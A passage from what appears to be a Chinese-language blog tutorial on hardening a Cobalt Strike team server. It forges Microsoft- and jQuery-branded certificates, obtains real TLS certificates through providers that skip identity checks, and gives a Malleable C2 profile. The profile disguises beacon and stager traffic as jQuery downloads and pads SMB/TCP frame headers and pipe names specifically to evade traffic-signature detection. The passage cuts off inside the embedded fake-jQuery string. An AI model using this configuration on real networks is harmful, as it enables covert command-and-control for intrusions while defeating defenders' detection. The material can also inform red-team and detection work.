class="line"></span><br><span class="line">别名: cobaltstrike</span><br><span class="line">创建日期: 2022-6-13</span><br><span class="line">条目类型: PrivateKeyEntry</span><br><span class="line">证书链长度: 1</span><br><span class="line">证书[1]:</span><br><span class="line">所有者: CN=*.microsoft.com, OU=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, ST=WA, C=US</span><br><span class="line">发布者: CN=*.microsoft.com, OU=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, ST=WA, C=US</span><br><span class="line">序列号: 21dcbd23</span><br><span class="line">生效时间: Mon Jun 13 15:52:02 CST 2022, 失效时间: Sun Sep 11 15:52:02 CST 2022</span><br><span class="line">证书指纹:</span><br><span class="line">         SHA1: B3:1E:0C:30:F4:33:57:31:8C:CF:D5:37:EF:32:0F:25:73:C7:AD:2C</span><br><span class="line">         SHA256: 2E:A0:BD:28:BD:F1:C9:F2:BC:BE:95:17:38:FB:6A:89:2E:B0:55:56:8C:D0:33:7F:FA:3F:77:BC:39:05:08:DF</span><br><span class="line">签名算法名称: SHA256withRSA</span><br><span class="line">主体公共密钥算法: 2048 位 RSA 密钥</span><br><span class="line">版本: 3</span><br><span class="line"></span><br><span class="line">扩展: </span><br><span class="line"></span><br><span class="line"><span class="comment">#1: ObjectId: 2.5.29.14 Criticality=false</span></span><br><span class="line">SubjectKeyIdentifier [</span><br><span class="line">KeyIdentifier [</span><br><span class="line">0000: 8B B3 9D E3 74 52 5C 89   78 71 38 5A 37 73 2B 13  ....tR\.xq8Z7s+.</span><br><span class="line">0010: C4 9B E2 F3                                        ....</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*******************************************</span><br><span class="line">*******************************************</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251726289.png" data-fancybox="true"/></div></div><h4 id="生成伪造证书"><a href="#生成伪造证书" class="headerlink" title="生成伪造证书"></a>生成伪造证书</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">mv</span> cobaltstrike.store cobaltstrike.store.bak</span><br><span class="line"></span><br><span class="line">sudo keytool -keystore cobaltstrike.store -storepass 1qazwsx -keypass 1qazwsx -genkeypair -keyalg RSA -<span class="built_in">alias</span> qq.com -dname <span class="string">&quot;CN=US, OU=qq.com, O=Software, L=Somewhere, ST=Cyberspace, C=CN&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -keystore cobaltstrike.store: 指定密钥库文件的名称,</span></span><br><span class="line"><span class="comment"># -storepass 1qazwsx: 密钥库的密码,</span></span><br><span class="line"><span class="comment"># -keypass 1qazwsx: 生成的密钥的密码,</span></span><br><span class="line"><span class="comment"># -genkeypair: 生成密钥对(包含公钥和私钥),</span></span><br><span class="line"><span class="comment"># -keyalg RSA: 指定使用的密钥算法为 RSA,</span></span><br><span class="line"><span class="comment"># -alias qq.com: 指定密钥的别名为 qq.com,</span></span><br><span class="line"><span class="comment"># -dname &quot;CN=US, OU=qq.com, O=Software, L=Somewhere, ST=Cyberspace, C=CN&quot;: 生成密钥时使用的 DN(区分名),</span></span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251726192.png" data-fancybox="true"/></div></div><p>然后在teamserver中修改以下两项即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-Djavax.net.ssl.keyStore=./cobaltstrike.store</span><br><span class="line">-Djavax.net.ssl.keyStorePassword=1qazwsx</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251726550.png" data-fancybox="true"/></div></div><p>虽然伪装的证书可以欺骗fofa这类搜索引擎.但毕竟是自签名,使用ssl证书查询工具是查询不到颁发机构的.</p><p>真正的证书是由证书签发机构颁布的.可以通过云服务器商免费申请ssl证书,不过国内要实名备案.</p><p>推荐国外云服务提供商,他们不需要实名备案.</p><p>证书格式推荐<code>jks</code>的证书,直接修改文件名.然后在<code>teamserver</code>中配置就可以了.</p><h4 id="Certbot免费申请SSL证书"><a href="#Certbot免费申请SSL证书" class="headerlink" title="Certbot免费申请SSL证书"></a>Certbot免费申请SSL证书</h4><h5 id="安装Certbot"><a href="#安装Certbot" class="headerlink" title="安装Certbot"></a>安装Certbot</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update &amp;&amp; sudo apt install certbot</span><br></pre></td></tr></table></figure><h5 id="添加A记录"><a href="#添加A记录" class="headerlink" title="添加A记录"></a>添加A记录</h5><p>添加需要申请域名的A记录,指向执行certbot脚本的服务器,</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251726298.png" data-fancybox="true"/></div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/opt/CS<span class="comment"># certbot -d ****.today --manual --preferred-challenges dns certonly</span></span><br><span class="line">Saving debug <span class="built_in">log</span> to /var/log/letsencrypt/letsencrypt.log</span><br><span class="line">Enter email address (used <span class="keyword">for</span> urgent renewal and security notices)</span><br><span class="line"> (Enter <span class="string">&#x27;c&#x27;</span> to cancel): <span class="built_in">test</span>@admin.com</span><br><span class="line"></span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">Please <span class="built_in">read</span> the Terms of Service at</span><br><span class="line">https://letsencrypt.org/documents/LE-SA-v1.4-April-3-2024.pdf. You must agree <span class="keyword">in</span></span><br><span class="line">order to register with the ACME server. Do you agree?</span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">(Y)es/(N)o: Y</span><br><span class="line"></span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">Would you be willing, once your first certificate is successfully issued, to</span><br><span class="line">share your email address with the Electronic Frontier Foundation, a founding</span><br><span class="line">partner of the Let<span class="string">&#x27;s Encrypt project and the non-profit organization that</span></span><br><span class="line"><span class="string">develops Certbot? We&#x27;</span>d like to send you email about our work encrypting the web,</span><br><span class="line">EFF news, campaigns, and ways to support digital freedom.</span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">(Y)es/(N)o: Y</span><br><span class="line">Account registered.</span><br><span class="line">Requesting a certificate <span class="keyword">for</span> ******.today</span><br><span class="line"></span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">Please deploy a DNS TXT record under the name:</span><br><span class="line"></span><br><span class="line">_acme-challenge.****.today.</span><br><span class="line"></span><br><span class="line">with the following value:</span><br><span class="line"></span><br><span class="line">3aDdvZOMSeocA**********JoETHEQQFqw</span><br><span class="line"></span><br><span class="line">Before continuing, verify the TXT record has been deployed. Depending on the DNS</span><br><span class="line">provider, this may take some time, from a few seconds to multiple minutes. You can</span><br><span class="line">check <span class="keyword">if</span> it has finished deploying with aid of online tools, such as the Google</span><br><span class="line">Admin Toolbox: https://toolbox.googleapps.com/apps/dig/<span class="comment">#TXT/_acme-challenge.******.today.</span></span><br><span class="line">Look <span class="keyword">for</span> one or more bolded line(s) below the line <span class="string">&#x27;;ANSWER&#x27;</span>. It should show the</span><br><span class="line">value(s) you<span class="string">&#x27;ve just added.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span></span><br><span class="line"><span class="string">Press Enter to Continue</span></span><br></pre></td></tr></table></figure><p>按照上边的提示添加一个name为<code>_acme-challenge.****.today</code>, value为<code>3aDdvZOMSeocA**********JoETHEQQFqw</code>的TXT解析记录,保存之后稍等一会儿再按回车,DNS解析需要点时间,大概需要一分钟就能生效.</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251726470.png" data-fancybox="true"/></div></div><p>回车之后,稍等片刻,如果申请成功会看到以下信息.</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251726920.png" data-fancybox="true"/></div></div><h4 id="转换"><a href="#转换" class="headerlink" title="转换"></a>转换</h4><p>pem、crt格式的证书需进行转换,先加一下密码.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -<span class="keyword">in</span> privkey.pem -aes256 -out privkey_with_password.pem</span><br><span class="line"><span class="comment"># 转换为p12格式</span></span><br><span class="line">openssl pkcs12 -<span class="built_in">export</span> -out mycert.p12 -inkey privkey_with_password.pem -<span class="keyword">in</span> fullchain.pem -passout pass:YourP12Password</span><br><span class="line"></span><br><span class="line"><span class="comment"># -export: 指示 openssl 导出到 P12 文件,</span></span><br><span class="line"><span class="comment"># -out mycert.p12: 指定输出的 P12 文件名,</span></span><br><span class="line"><span class="comment"># -inkey privkey_with_password.pem: 指定包含密码的私钥文件,</span></span><br><span class="line"><span class="comment"># -in /etc/letsencrypt/live/yourdomain.com/fullchain.pem: 指定包含证书链的文件,</span></span><br><span class="line"><span class="comment"># -passout pass:YourP12Password: 用于设置 P12 文件的密码,请将 YourP12Password 替换为你希望使用的密码,</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">mv</span> mycert.p12 /opt/CS/coablt_strike_4.5_jx/mycert.store</span><br></pre></td></tr></table></figure><p>crt格式—&gt;store</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -import -trustcacerts -<span class="built_in">alias</span> mykey -file domain.crt -keystore domain.store</span><br></pre></td></tr></table></figure><p>然后在<code>teamserver</code>及<code>profile</code>对应位置修改证书路径及密码</p><h3 id="配置Profile"><a href="#配置Profile" class="headerlink" title="配置Profile"></a>配置Profile</h3><p>cs中默认是没有<code>profile</code>文件的 , 需要自己配置 , 而且官网称<code>profile</code>文件为<code>Malleablec2</code>,整个<code>profile</code>文件的配置就是进行流量上的伪装, 把命令的下发和结果的回传进行包装 , 让他从流量上看起来更像是在访问网页.</p><h4 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置全局变量sample_name , 值是当前文件名</span></span><br><span class="line"><span class="built_in">set</span> sample_name <span class="string">&quot;jQuery CS 4.5 Profile&quot;</span>;</span><br><span class="line"><span class="comment"># 设置心跳包的时间 , 单位毫秒</span></span><br><span class="line"><span class="built_in">set</span> sleeptime <span class="string">&quot;1000&quot;</span>; </span><br><span class="line"><span class="comment"># set sleeptime &quot;&lt;60000&gt;&quot;; # 1 Minute , 默认的</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> jitter <span class="string">&quot;50&quot;</span>; <span class="comment"># 设置心跳包时间的波动范围 45 +- 45*37% </span></span><br><span class="line"><span class="built_in">set</span> data_jitter <span class="string">&quot;100&quot;</span>; <span class="comment"># 意味着每次HTTP服务器响应时,都会附加一个长度在0到100个字符之间的随机字符串,这样做的目的是为了增加服务器响应的大小的不可预测性,使得Cobalt Strike的通信模式更难以通过网络监控工具被识别和分析.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置全局的UA头</span></span><br><span class="line"><span class="built_in">set</span> useragent <span class="string">&quot;Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko&quot;</span>;</span><br></pre></td></tr></table></figure><h4 id="SSL证书设置"><a href="#SSL证书设置" class="headerlink" title="SSL证书设置"></a>SSL证书设置</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">https-certificate &#123;</span><br><span class="line">    <span class="built_in">set</span> C   <span class="string">&quot;US&quot;</span>;    <span class="comment">#国家</span></span><br><span class="line">    <span class="built_in">set</span> CN  <span class="string">&quot;jquery.com&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> O   <span class="string">&quot;jQuery&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> OU  <span class="string">&quot;Certificate Authority&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> validity <span class="string">&quot;365&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">set</span> keystore <span class="string">&quot;cobaltstrike.store&quot;</span>; <span class="comment"># 证书文件</span></span><br><span class="line">    <span class="built_in">set</span> password <span class="string">&quot;1qazwsx&quot;</span>;  <span class="comment"># 证书密码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h4><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409260834819.png" data-fancybox="true"/></div></div><p>在通过 CS 进行内网渗透的过程中,出网的OA系统与我们的TeamServer服务器建立了<code>HTTP Beacon</code>进程,而域控系统不出网它与OA系统建立<code>SMB Beacon</code>的进程,这两个进程之间进行通信就涉及到了一个概念:<strong>命名管道</strong></p><p>那么我们可以自定义修改什么东西呢?首先了解一下 SMB 头的结构:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># SMB Beacon </span></span><br><span class="line"><span class="comment"># SMB [长度][数据]</span></span><br><span class="line"><span class="built_in">set</span> smb_frame_header <span class="string">&quot;\x80&quot;</span>;</span><br><span class="line"><span class="built_in">set</span> pipename         <span class="string">&quot;pmns.8507.1179.793340931646472486##&quot;</span>; <span class="comment"># smb管道的名字</span></span><br><span class="line"><span class="built_in">set</span> pipename_stager  <span class="string">&quot;pmns.8507.1179.793340931646472486##&quot;</span>;  <span class="comment"># smb stager管道的名字</span></span><br></pre></td></tr></table></figure><p>而有一些流量监测设备它会先取到 SMB 的长度值,然后根据长度向后进行匹配数据内容,并将匹配的数据内容与特征库中记录进行对比,如果匹配上了就会被识别出是一个<code>SMB Beacon</code>的进程,然后就会被查杀.</p><p>对抗方法:<code>set smb_frame_header=&quot;McZqJerrcYXxBoQNxrepOqPQ \x80&quot;;</code>我们在前面加上一些垃圾字符,使其无法正常匹配到关键信息.在 CS 里<code>SMB Beacon</code>还会有一个管道名(<code>pipename</code>),而它的值还是默认的,这部分值也有可能会被提取出来加入特征库,所以我们在使用的过程中必须对<code>pipename</code>进行一个自定义.<code>set pipename &quot;McZqJerrcYXxBoQNxrepOqPQ-#####&quot;;</code></p><p><strong>pipename和pipename_stager字符串不要一样</strong></p><blockquote><p><code>pipename_stager</code>:CS 提供一个功能:<code>jump-&gt;psexec</code>使用的就是 SMB 协议,当我们的OA系统与域控系统连接时就是建立的<code>SMB Beacon</code>进程,建立这样的一个进程会在域控系统上上传某个文件并运行,但是如果这样的文件大小太大,就容易被流量设备检测到并中断,所以这里就应用了一种思想“小马拉大马”,通过上传一个小文件再利用这个小文件上传大文件.这就是<code>pipename_stager</code>.</p></blockquote><h4 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h4><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409260834924.png" data-fancybox="true"/></div></div><p>因为现在在内网中SMB的查杀非常严格,所以在我们自定义不好的情况下,可以考虑TCP 建立这样的连接,也就是我们的承载协议变成了 TCP.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># TCP Beacon监听端口</span></span><br><span class="line"><span class="comment"># 同样是增加混淆的字符进行绕过</span></span><br><span class="line"><span class="built_in">set</span> tcp_frame_header <span class="string">&quot;McZqJerrcYXxBoQNxrepOqPQ \x80&quot;</span>;</span><br><span class="line"><span class="built_in">set</span> tcp_port <span class="string">&quot;42585&quot;</span>;</span><br></pre></td></tr></table></figure><h4 id="DNS-Beacon"><a href="#DNS-Beacon" class="headerlink" title="DNS-Beacon"></a>DNS-Beacon</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">dns-beacon &#123;</span><br><span class="line">    <span class="built_in">set</span> dns_idle           <span class="string">&quot;114.114.114.114&quot;</span>; <span class="comment"># 第一次dns查询的地址</span></span><br><span class="line">    <span class="built_in">set</span> dns_max_txt        <span class="string">&quot;252&quot;</span>; <span class="comment"># 最大查询次数 , 255以下 , 能被4整除</span></span><br><span class="line">    <span class="built_in">set</span> dns_sleep          <span class="string">&quot;0&quot;</span>;   <span class="comment"># sleep时间</span></span><br><span class="line">    <span class="built_in">set</span> dns_ttl            <span class="string">&quot;5&quot;</span>;   <span class="comment"># tll值</span></span><br><span class="line">    <span class="built_in">set</span> maxdns             <span class="string">&quot;255&quot;</span>; <span class="comment"># 最大dns服务转接数量</span></span><br><span class="line">    <span class="built_in">set</span> dns_stager_prepend <span class="string">&quot;.resources.123456.&quot;</span>; <span class="comment"># 使用dns协议的马,pe头追加的内容</span></span><br><span class="line">    <span class="built_in">set</span> dns_stager_subhost <span class="string">&quot;.feeds.123456.&quot;</span>;     <span class="comment"># 子域名的查询配置</span></span><br><span class="line">    <span class="comment"># DNS subhosts override options, added in version 4.3</span></span><br><span class="line">    <span class="built_in">set</span> beacon           <span class="string">&quot;a.bc.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> get_A            <span class="string">&quot;b.1a.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> get_AAAA         <span class="string">&quot;c.4a.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> get_TXT          <span class="string">&quot;d.tx.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> put_metadata     <span class="string">&quot;e.md.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> put_output       <span class="string">&quot;f.po.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> ns_response      <span class="string">&quot;zero&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="SSH-Beacon"><a href="#SSH-Beacon" class="headerlink" title="SSH-Beacon"></a>SSH-Beacon</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> ssh_banner        <span class="string">&quot;OpenSSH_7.4 Debian (protocol 2.0)&quot;</span>;  <span class="comment"># SSH连接的banner信息</span></span><br><span class="line"><span class="built_in">set</span> ssh_pipename      <span class="string">&quot;miuJRfvN##&quot;</span>; <span class="comment"># 定义了用于SSH伪Beacon通信的命名管道的名称前缀,##是一个占位符</span></span><br></pre></td></tr></table></figure><h4 id="Http-Stager"><a href="#Http-Stager" class="headerlink" title="Http-Stager"></a>Http-Stager</h4><blockquote><p>Http-Stager块是用来自定义HTTP阶段化(staging)过程的配置,阶段化是Cobalt Strike中的一个重要概念,它指的是将第二阶段的有效载荷(即用于后渗透测试的代码)传输到已经受到攻击者控制的主机上的过程.</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  用于指定是否启用通过HTTP、HTTPS或DNS进行阶段化(第二阶段)的有效载荷(payload)托管,</span></span><br><span class="line"><span class="built_in">set</span> host_stage <span class="string">&quot;true&quot;</span>; <span class="comment"># Host payload for staging over HTTP, HTTPS, or DNS. Required by stagers.set</span></span><br><span class="line">http-stager &#123;  </span><br><span class="line">    <span class="built_in">set</span> uri_x86 <span class="string">&quot;/jquery-3.3.1.slim.min.js&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> uri_x64 <span class="string">&quot;/jquery-3.3.2.slim.min.js&quot;</span>;</span><br><span class="line">    server &#123;</span><br><span class="line">        header <span class="string">&quot;Server&quot;</span> <span class="string">&quot;NetDNA-cache/2.2&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Cache-Control&quot;</span> <span class="string">&quot;max-age=0, no-cache&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Pragma&quot;</span> <span class="string">&quot;no-cache&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;keep-alive&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/javascript; charset=utf-8&quot;</span>;</span><br><span class="line">        output &#123;</span><br><span class="line">            <span class="comment">## The javascript was changed.  Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values)</span></span><br><span class="line">            <span class="comment"># 2nd Line            </span></span><br><span class="line">            prepend <span class="string">&quot;!function(e,t)&#123;\&quot;use strict\&quot;;\&quot;object\&quot;==typeof module&amp;&amp;\&quot;object\&quot;==typeof module.exports?module.exports=e.document?t(e,!0):function(e)&#123;if(!e.document)throw new Error(\&quot;jQuery requires a window with a document\&quot;);return t(e)&#125;:t(e)&#125;(\&quot;undefined\&quot;!=typeof window?window:this,function(e,t)&#123;\&quot;use strict\&quot;;var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l=&#123;&#125;,c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h=&#123;&#125;,g=function e(t)&#123;return\&quot;function\&quot;==typeof t&amp;&amp;\&quot;number\&quot;!=typeof t.nodeType&#125;,y=function e(t)&#123;return null!=t&amp;&amp;t===t.window&#125;,v=&#123;type:!0,src:!0,noModule:!0&#125;;function m(e,t,n)&#123;var i,o=(t=t||r).createElement(\&quot;script\&quot;);if(o.text=e,n)for(i in v)n[i]&amp;&amp;(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)&#125;function x(e)&#123;return null==e?e+\&quot;\&quot;:\&quot;object\&quot;==typeof e||\&quot;function\&quot;==typeof e?l[c.call(e)]||\&quot;object\&quot;:typeof e&#125;var b=\&quot;3.3.1\&quot;,w=function(e,t)&#123;return new w.fn.init(e,t)&#125;,T=/^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g;w.fn=w.prototype=&#123;jquery:\&quot;3.3.1\&quot;,constructor:w,length:0,toArray:function()&#123;return o.call(this)&#125;,get:function(e)&#123;return null==e?o.call(this):e&lt;0?this[e+this.length]:this[e]&#125;,pushStack:function(e)&#123;var t=w.merge(this.constructor(),e);return t.prevObject=this,t&#125;,each:function(e)&#123;return w.each(this,e)&#125;,map:function(e)&#123;return this.pushStack(w.map(this,function(t,n)&#123;return e.call(t,n,t)&#125;))&#125;,slice:function()&#123;return this.pushStack(o.apply(this,arguments))&#125;,first:function()&#123;return this.eq(0)&#125;,last:function()&#123;return this.eq(-1)&#125;,eq:function(e)&#123;var t=this.length,n=+e+(e&lt;0?t:0);return this.pushStack(n&gt;=0&amp;&amp;n&lt;t?[this[n]]:[])&#125;,end:function()&#123;return this.prevObject||this.constructor()&#125;,push:s,sort:n.sort,splice:n.splice&#125;,w.extend=w.fn.extend=function()&#123;var e,t,n,r,i,o,a=arguments[0]||&#123;&#125;,s=1,u=arguments.length,l=!1;for(\&quot;boolean\&quot;==typeof a&amp;&amp;(l=a,a=arguments[s]||&#123;&#125;,s++),\&quot;object\&quot;==typeof a||g(a)||(a=&#123;&#125;),s===u&amp;&amp;(a=this,s--);s&lt;u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&amp;&amp;(l&amp;&amp;r&amp;&amp;(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&amp;&amp;Array.isArray(n)?n:[]):o=n&amp;&amp;w.isPlainObject(n)?n:&#123;&#125;,a[t]=w.extend(l,o,r)):void 0!==r&amp;&amp;(a[t]=r));return a&#125;,w.extend(&#123;expando:\&quot;jQuery\&quot;+(\&quot;3.3.1\&quot;+Math.random()).replace(/\\D/g,\&quot;\&quot;),isReady:!0,error:function(e)&#123;throw new Error(e)&#125;,noop:function()&#123;&#125;,isPlainObject:function(e)&#123;var t,n;return!(!e||\&quot;[object Object]\&quot;!==c.call(e))&amp;&amp;(!(t=i(e))||\&quot;function\&quot;==typeof(n=f.call(t,\&quot;constructor\&quot;)&amp;&amp;t.constructor)&amp;&amp;p.call(n)===d)&#125;,isEmptyObject:function(e)&#123;var t;for(t in e)return!1;return!0&#125;,globalEval:function(e)&#123;m(e)&#125;,each:function(e,t)&#123;var n,r=0;if(C(e))&#123;for(n=e.length;r&lt;n;r++)if(!1===t.call(e[r],r,e[r]))break&#125;else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e&#125;,trim:function(e)&#123;return null==e?\&quot;\&quot;:(e+\&quot;\&quot;).replace(T,\&quot;\&quot;)&#125;,makeArray:function(e,t)&#123;var n=t||[];return null!=e&amp;&amp;(C(Object(e))?w.merge(n,\&quot;string\&quot;==typeof e?[e]:e):s.call(n,e)),n&#125;,inArray:function(e,t,n)&#123;return null==t?-1:u.call(t,e,n)&#125;,merge:function(e,t)&#123;for(var n=+t.length,r=0,i=e.length;r&lt;n;r++)e[i++]=t[r];return e.length=i,e&#125;,grep:function(e,t,n)&#123;for(var r,i=[],o=0,a=e.length,s=!n;o&lt;a;o++)(r=!t(e[o],o))!==s&amp;&amp;i.push(e[o]);return i&#125;,map:function(e,t,n)&#123;var r,i,o=0,s=[];if(C(e))for(r=e.length;o&lt;r;o++)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);return a.apply([],s)&#125;,guid:1,support:h&#125;),\&quot;function\&quot;==typeof Symbol&amp;&amp;(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each(\&quot;Boolean Number String Function Array Date RegExp Object Error Symbol\&quot;.split(\&quot; \&quot;),function(e,t)&#123;l[\&quot;[object \&quot;+t+\&quot;]\&quot;]=t.toLowerCase()&#125;);function C(e)&#123;var t=!!e&amp;&amp;\&quot;length\&quot;in e&amp;&amp;e.length,n=x(e);return!g(e)&amp;&amp;!y(e)&amp;&amp;(\&quot;array\&quot;===n||0===t||\&quot;number\&quot;==typeof t&amp;&amp;t&gt;0&amp;&amp;t-1 in e)&#125;var E=function(e)&#123;var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b=\&quot;sizzle\&quot;+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t)&#123;return 